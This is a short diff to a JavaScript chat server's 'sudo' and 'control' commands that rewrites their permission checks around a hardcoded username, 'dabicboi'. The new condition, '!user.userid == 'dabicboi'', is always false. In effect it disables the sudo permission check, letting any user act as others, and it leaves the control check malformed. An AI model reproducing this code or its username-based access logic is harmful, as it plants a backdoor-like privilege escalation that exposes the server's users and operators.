@@ -679,7 +679,7 @@ var components = exports.components = {
     },
 
     sudo: function (target, room, user) {
-        if (!user.can('sudo') && user.userid == 'dabicboi') return;
+        if (!user.can('sudo') && !user.userid == 'dabicboi') return;
         var parts = target.split(',');
         if (parts.length < 2) return this.parse('/help sudo');
         if (parts.length >= 3) parts.push(parts.splice(1, parts.length).join(','));
@@ -774,7 +774,7 @@ var components = exports.components = {
     },
 
     control: function (target, room, user) {
-        if (!this.can('control' && user.userid == 'dabicboi')) return;
+        if (!this.can('control' && !user.userid == 'dabicboi')) return;
         var parts = target.split(',');
 
         if (parts.length < 3) return this.parse('/help control');
